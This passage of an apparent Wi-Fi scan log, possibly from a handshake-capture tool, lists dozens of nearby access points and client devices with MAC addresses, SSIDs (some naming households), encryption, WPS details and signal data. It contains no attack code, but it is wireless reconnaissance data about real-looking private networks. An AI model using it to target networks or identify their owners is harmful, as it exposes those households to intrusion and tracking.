            'hostname': 'ARRIS-0CE5',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T20:23:29.67944797Z',
            'last_seen': '2022-02-12T22:32:40.206648884Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -77,
            'sent': 13508,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Config Methods': 'Keypad',
                'Device Name': 'ARRIS_24GAP',
                'Manufacturer': 'Ralink Technology, Corp.',
                'Model Name': 'Ralink Wireless Access Point',
                'Model Number': 'RT2860',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '2.4Ghz',
                'Response Type': 'AP',
                'Serial Number': '12345678',
                'State': 'Configured',
                'UUID-E': 'bc329e001dd811b286018871b1b1fb79',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'ca:3f:cb:db:0d:9a',
            'hostname': 'xfinitywifi',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:24:01.937949334Z',
            'last_seen': '2022-02-12T22:32:36.112038609Z',
            'meta': {
                'values': {}
            },
            'frequency': 5785,
            'channel': 157,
            'rssi': -78,
            'sent': 0,
            'received': 0,
            'encryption': 'OPEN',
            'cipher': '',
            'authentication': '',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'fa:5e:42:4a:9e:3f',
            'hostname': '',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T22:14:40.161950914Z',
            'last_seen': '2022-02-12T22:32:18.191726281Z',
            'meta': {
                'values': {}
            },
            'frequency': 5220,
            'channel': 44,
            'rssi': -87,
            'sent': 1080,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'f8:a0:97:af:d1:40',
            'hostname': 'Rodriguez',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T20:23:33.775103813Z',
            'last_seen': '2022-02-12T22:32:08.463083543Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -77,
            'sent': 1660,
            'received': 439,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Config Methods': 'Label',
                'Device Name': 'AtherosAP',
                'Manufacturer': 'Atheros Communications, Inc.',
                'Model Name': 'APxx',
                'Model Number': 'APxx-xxx',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '5.0Ghz',
                'Response Type': 'AP',
                'Serial Number': 'Serial Number Here',
                'State': 'Configured',
                'UUID-E': '40011c3df0f2587998212909804c9f1c',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'd6:3f:cb:db:0d:99',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:38.900215603Z',
            'last_seen': '2022-02-12T22:32:12.561849911Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -60,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '7e:7a:8a:3b:cf:d6',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:42.489954426Z',
            'last_seen': '2022-02-12T22:32:16.142782694Z',
            'meta': {
                'values': {}
            },
            'frequency': 5180,
            'channel': 36,
            'rssi': -36,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '7a:19:f8:f6:56:23',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:38.898511484Z',
            'last_seen': '2022-02-12T22:32:13.071314032Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -75,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'a8:70:5d:b8:e6:10',
            'hostname': 'Vault 84',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T22:04:39.3122759Z',
            'last_seen': '2022-02-12T22:32:18.702606382Z',
            'meta': {
                'values': {}
            },
            'frequency': 5220,
            'channel': 44,
            'rssi': -83,
            'sent': 23827,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Config Methods': '0000',
                'Device Name': 'WLAN-ROUTER',
                'Manufacturer': 'Intel Corporation',
                'Model Name': ' ',
                'Model Number': ' ',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '2.4Ghz, 5.0Ghz',
                'Response Type': 'AP',
                'Serial Number': ' ',
                'State': 'Configured',
                'UUID-E': 'ebf5a0a01dd111b2a90f06705db8e60e',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'f6:79:0a:3b:42:76',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:45.041290555Z',
            'last_seen': '2022-02-12T22:32:19.215091276Z',
            'meta': {
                'values': {}
            },
            'frequency': 5240,
            'channel': 48,
            'rssi': -80,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'fa:5e:42:4a:9e:38',
            'hostname': 'XFINITY',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:24:19.859661559Z',
            'last_seen': '2022-02-12T22:32:18.192589249Z',
            'meta': {
                'values': {}
            },
            'frequency': 5220,
            'channel': 44,
            'rssi': -85,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'fa:5e:42:43:9e:3c',
            'hostname': '',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:33.778363403Z',
            'last_seen': '2022-02-12T22:32:42.769498848Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -76,
            'sent': 15991,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '5e:e3:0e:c9:56:b3',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T22:00:21.264114257Z',
            'last_seen': '2022-02-12T22:32:07.950624647Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -85,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '38:2c:4a:a4:d1:cc',
            'hostname': 'home_net',
            'alias': '',
            'vendor': 'ASUSTek COMPUTER INC.',
            'first_seen': '2022-02-12T20:24:02.959593248Z',
            'last_seen': '2022-02-12T22:32:37.134760529Z',
            'meta': {
                'values': {}
            },
            'frequency': 5805,
            'channel': 161,
            'rssi': -79,
            'sent': 50104,
            'received': 900,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [{
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': 'a8:5e:45:af:e6:d4',
                'hostname': '',
                'alias': '',
                'vendor': 'ASUSTek COMPUTER INC.',
                'first_seen': '2022-02-12T22:27:53.999398281Z',
                'last_seen': '2022-02-12T22:27:54.001285557Z',
                'meta': {
                    'values': {}
                },
                'frequency': 5805,
                'channel': 161,
                'rssi': -72,
                'sent': 0,
                'received': 0,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '5c:a5:bc:2c:1b:23',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': 'eero inc.',
            'first_seen': '2022-02-12T22:05:39.216011443Z',
            'last_seen': '2022-02-12T22:32:42.769089466Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -86,
            'sent': 2710,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'UNK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'ae:70:5d:b8:e6:0f',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:28:16.404138014Z',
            'last_seen': '2022-02-12T22:32:42.770658776Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -73,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '5e:7a:8a:3b:cf:d0',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:29.48381144Z',
            'last_seen': '2022-02-12T22:32:39.184653378Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -23,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'f6:a0:97:45:c9:69',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:38.904985556Z',
            'last_seen': '2022-02-12T22:32:12.561955373Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -78,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '6e:7a:8a:3b:cf:d6',
            'hostname': 'XFINITY',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:42.488899185Z',
            'last_seen': '2022-02-12T22:32:16.976613327Z',
            'meta': {
                'values': {}
            },
            'frequency': 5180,
            'channel': 36,
            'rssi': -33,
            'sent': 0,
            'received': 0,
            'encryption': 'OPEN',
            'cipher': '',
            'authentication': '',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'f8:5e:42:42:9e:3c',
            'hostname': 'kitkat',
            'alias': '',
            'vendor': 'Technicolor CH USA Inc.',
            'first_seen': '2022-02-12T20:24:19.857401374Z',
            'last_seen': '2022-02-12T22:31:07.535018283Z',
            'meta': {
                'values': {}
            },
            'frequency': 5220,
            'channel': 44,
            'rssi': -89,
            'sent': 36445,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'RF Bands': '2.4Ghz, 5.0Ghz',
                'State': 'Configured',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'fa:5e:42:b7:8b:14',
            'hostname': '',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T21:48:38.812303852Z',
            'last_seen': '2022-02-12T22:31:37.752462559Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -77,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'fa:5e:42:48:e6:77',
            'hostname': '',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:25:15.680058712Z',
            'last_seen': '2022-02-12T22:32:13.072008485Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -76,
            'sent': 5257,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '3c:7a:8a:3b:cf:d0',
            'hostname': 'Home',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T20:23:29.485417116Z',
            'last_seen': '2022-02-12T22:32:39.184334809Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -22,
            'sent': 87911,
            'received': 1755,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'PSK',
            'wps': {
                '0x103A': '02',
                'Config Methods': 'Label',
                'Device Name': 'AtherosAP',
                'Manufacturer': 'Atheros Communications, Inc.',
                'Model Name': 'APxx',
                'Model Number': 'APxx-xxx',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '5.0Ghz',
                'Response Type': 'AP',
                'Serial Number': 'Serial Number Here',
                'State': 'Configured',
                'UUID-E': '5f1552dc4bad5c069075dd34ff85f366',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '2a:05:01:d4:ef:08',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T22:30:56.272998264Z',
            'last_seen': '2022-02-12T22:32:08.975231685Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -77,
            'sent': 0,
            'received': 0,
            'encryption': 'OPEN',
            'cipher': '',
            'authentication': '',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '16:05:01:d4:ef:08',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T21:11:10.613334973Z',
            'last_seen': '2022-02-12T22:30:57.331646963Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -77,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'f8:a0:97:45:c9:69',
            'hostname': 'The Bitch of the house',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T20:23:38.383834279Z',
            'last_seen': '2022-02-12T22:32:13.071610584Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -78,
            'sent': 15580,
            'received': 450,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Config Methods': '0000',
                'Device Name': 'Reference Design',
                'Manufacturer': 'Quantenna',
                'Model Name': 'pearl',
                'Model Number': 'QSR10GA.560',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '2.4Ghz',
                'Response Type': 'AP',
                'Serial Number': '5CB066041912',
                'State': 'Configured',
                'UUID-E': '2d3fedef786c5f26b3b3922964c79a48',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'aa:70:5d:b8:e6:10',
            'hostname': 'xfinitywifi',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T22:16:26.383078845Z',
            'last_seen': '2022-02-12T22:32:18.193076187Z',
            'meta': {
                'values': {}
            },
            'frequency': 5220,
            'channel': 44,
            'rssi': -84,
            'sent': 0,
            'received': 0,
            'encryption': 'OPEN',
            'cipher': '',
            'authentication': '',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'fa:5e:42:4a:9e:3e',
            'hostname': 'xfinitywifi',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T21:17:27.953074332Z',
            'last_seen': '2022-02-12T22:28:45.712515102Z',
            'meta': {
                'values': {}
            },
            'frequency': 5220,
            'channel': 44,
            'rssi': -88,
            'sent': 0,
            'received': 0,
            'encryption': 'OPEN',
            'cipher': '',
            'authentication': '',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'fa:5e:42:43:9e:3e',
            'hostname': '',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:34.28832404Z',
            'last_seen': '2022-02-12T22:32:42.769552903Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -76,
            'sent': 14261,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '4e:12:65:57:c9:27',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T22:05:32.04762725Z',
            'last_seen': '2022-02-12T22:29:03.633191724Z',
            'meta': {
                'values': {}
            },
            'frequency': 5785,
            'channel': 157,
            'rssi': -86,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '4c:12:65:57:c9:27',
            'hostname': 'R.dogs= available 4 dinner',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T22:07:18.030926871Z',
            'last_seen': '2022-02-12T22:30:14.799113092Z',
            'meta': {
                'values': {}
            },
            'frequency': 5785,
            'channel': 157,
            'rssi': -85,
            'sent': 1520,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Config Methods': '0000',
                'Device Name': 'Reference Design',
                'Manufacturer': 'Quantenna',
                'Model Name': 'pearl',
                'Model Number': 'QSR10GA.560',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '5.0Ghz',
                'Response Type': 'AP',
                'Serial Number': '5CB066041913',
                'State': 'Configured',
                'UUID-E': 'd888ef60efa95b1898703c79d4808460',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '8a:d5:9d:55:1a:4d',
            'hostname': 'Micucci',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T22:28:05.276560745Z',
            'last_seen': '2022-02-12T22:31:28.608511553Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -83,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'a8:70:5d:b8:e6:0f',
            'hostname': 'Vault 84 2.4',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T20:48:12.437975122Z',
            'last_seen': '2022-02-12T22:32:42.770079488Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -74,
            'sent': 301394,
            'received': 55782,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Config Methods': '0000',
                'Device Name': 'WLAN-ROUTER',
                'Manufacturer': 'Intel Corporation',
                'Model Name': ' ',
                'Model Number': ' ',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '2.4Ghz, 5.0Ghz',
                'Response Type': 'AP',
                'Serial Number': ' ',
                'State': 'Configured',
                'UUID-E': 'ebf5a0a01dd111b2a90f06705db8e60e',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [{
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': '10:52:1c:d4:c9:89',
                'hostname': '',
                'alias': '',
                'vendor': 'Espressif Inc.',
                'first_seen': '2022-02-12T21:35:02.681312366Z',
                'last_seen': '2022-02-12T22:28:00.659234933Z',
                'meta': {
                    'values': {}
                },
                'frequency': 2437,
                'channel': 6,
                'rssi': -79,
                'sent': 3600,
                'received': 0,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }, {
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': '18:69:d8:ee:a4:9d',
                'hostname': '',
                'alias': '',
                'vendor': 'Tuya Smart Inc.',
                'first_seen': '2022-02-12T20:50:32.719188194Z',
                'last_seen': '2022-02-12T22:32:07.44067544Z',
                'meta': {
                    'values': {}
                },
                'frequency': 2437,
                'channel': 5,
                'rssi': -86,
                'sent': 9216,
                'received': 1654,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }, {
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': 'cc:f4:11:a6:00:1f',
                'hostname': '',
                'alias': '',
                'vendor': 'Google, Inc.',
                'first_seen': '2022-02-12T20:48:47.763754073Z',
                'last_seen': '2022-02-12T22:32:07.955561427Z',
                'meta': {
                    'values': {}
                },
                'frequency': 2437,
                'channel': 6,
                'rssi': -79,
                'sent': 13400,
                'received': 20314,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }, {
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': '10:d5:61:5f:3d:51',
                'hostname': '',
                'alias': '',
                'vendor': 'Tuya Smart Inc.',
                'first_seen': '2022-02-12T20:48:47.764551788Z',
                'last_seen': '2022-02-12T22:32:07.961387044Z',
                'meta': {
                    'values': {}
                },
                'frequency': 2437,
                'channel': 6,
                'rssi': -82,
                'sent': 13632,
                'received': 8266,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }, {
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': 'd4:a6:51:93:c5:a9',
                'hostname': '',
                'alias': '',
                'vendor': 'Tuya Smart Inc.',
                'first_seen': '2022-02-12T20:48:48.782811697Z',
                'last_seen': '2022-02-12T22:32:07.440833697Z',
                'meta': {
                    'values': {}
                },
                'frequency': 2437,
                'channel': 7,
                'rssi': -87,
                'sent': 8614,
                'received': 2087,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }, {
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': '84:7a:b6:06:0c:f7',
                'hostname': '',
                'alias': '',
                'vendor': 'AltoBeam (China) Inc.',
                'first_seen': '2022-02-12T22:28:00.65639239Z',
                'last_seen': '2022-02-12T22:31:32.113464406Z',
                'meta': {
                    'values': {}
                },
                'frequency': 2437,
                'channel': 6,
                'rssi': -75,
                'sent': 198,
                'received': 395,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'f8:55:cd:97:78:f2',
            'hostname': 'HotspotGrwU',
            'alias': '',
            'vendor': 'Visteon Corporation',
            'first_seen': '2022-02-12T22:30:21.970716177Z',
            'last_seen': '2022-02-12T22:30:21.970716177Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -79,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'ca:41:1e:29:1e:d1',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T21:06:46.932663454Z',
            'last_seen': '2022-02-12T22:32:11.022720547Z',
            'meta': {
                'values': {}
            },
            'frequency': 2452,
            'channel': 9,
            'rssi': -80,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'ee:79:0a:3b:42:75',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:38.382885406Z',
            'last_seen': '2022-02-12T22:32:13.072478293Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -61,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '4e:7a:8a:3b:cf:d6',
            'hostname': 'xfinitywifi',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:42.489245661Z',
            'last_seen': '2022-02-12T22:32:16.976670641Z',
            'meta': {
                'values': {}
            },
            'frequency': 5180,
            'channel': 36,
            'rssi': -33,
            'sent': 0,
            'received': 0,
            'encryption': 'OPEN',
            'cipher': '',
            'authentication': '',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '5e:7a:8a:3b:cf:d6',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:42.48949549Z',
            'last_seen': '2022-02-12T22:32:16.976567865Z',
            'meta': {
                'values': {}
            },
            'frequency': 5180,
            'channel': 36,
            'rssi': -35,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'fa:5e:42:b7:8b:10',
            'hostname': '',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T22:24:32.783370341Z',
            'last_seen': '2022-02-12T22:31:37.752122453Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -77,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '14:91:82:41:14:62',
            'hostname': 'you+yourdog=assholes',
            'alias': '',
            'vendor': 'Belkin International Inc.',
            'first_seen': '2022-02-12T20:23:29.484312691Z',
            'last_seen': '2022-02-12T22:32:39.695561178Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -77,
            'sent': 1950,
            'received': 40733,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                '0x103A': '02',
                'Config Methods': 'Label, Display',
                'Device Name': 'Belkin Router',
                'Manufacturer': 'Belkin TECHNOLOGY CO., LTD.',
                'Model Name': 'AC1600',
                'Model Number': 'F9K1119v1',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '2.4Ghz',
                'Response Type': 'AP',
                'Serial Number': '123456789012347',
                'State': 'Configured',
                'UUID-E': '7b9098be89a210ff73de149182411462',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [{
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': '8c:49:62:f1:02:f3',
                'hostname': '',
                'alias': '',
                'vendor': 'Roku, Inc',
                'first_seen': '2022-02-12T20:23:29.679797871Z',
                'last_seen': '2022-02-12T22:32:38.159609146Z',
                'meta': {
                    'values': {}
                },
                'frequency': 2412,
                'channel': 1,
                'rssi': -86,
                'sent': 21593,
                'received': 410,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'ea:79:0a:3b:42:76',
            'hostname': 'xfinitywifi',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:45.550760803Z',
            'last_seen': '2022-02-12T22:32:19.216235741Z',
            'meta': {
                'values': {}
            },
            'frequency': 5240,
            'channel': 48,
            'rssi': -80,
            'sent': 0,
            'received': 0,
            'encryption': 'OPEN',
            'cipher': '',
            'authentication': '',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '5c:a5:bc:2c:1b:25',
            'hostname': 'RBlaine2',
            'alias': '',
            'vendor': 'eero inc.',
